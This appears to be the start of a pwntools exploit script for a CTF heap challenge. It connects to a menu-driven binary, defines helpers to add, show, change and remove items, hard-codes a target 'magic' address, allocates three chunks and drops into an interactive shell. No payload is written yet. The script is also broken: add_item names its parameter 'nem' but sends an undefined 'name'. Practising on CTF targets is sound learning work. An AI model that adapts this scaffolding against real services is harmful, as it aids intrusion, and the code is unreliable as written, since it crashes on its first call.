from pwn import *
from time import sleep
context.arch = 'amd64'

#r = remote('csie.ctf.tw',10137)
r = remote('localhost',8888)

#r.interactive()
size = '64'
content = 'faceb00c'
magic = 0x400c23
def add_item(size,nem):
    r.recvuntil(':')
    r.sendline('2')
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(name)
def show():
    r.recvuntil(':')
    r.sendline('1')
def change(idx,size,name):
    r.recvuntil(':')
    r.sendline('3')
    r.recvuntil(':')
    r.sendline(str(idx))
    r.recvuntil(':')
    r.sendline(str(size))
    r.recvuntil(':')
    r.sendline(name)
def remove(idx):
    r.recvuntil(':')
    r.sendline('4')
    r.recvuntil(':')
    r.sendline(str(idx))

#add
add_item(0x80,'a')
add_item(0x80,'a')
add_item(0x80,'a')

r.interactive()
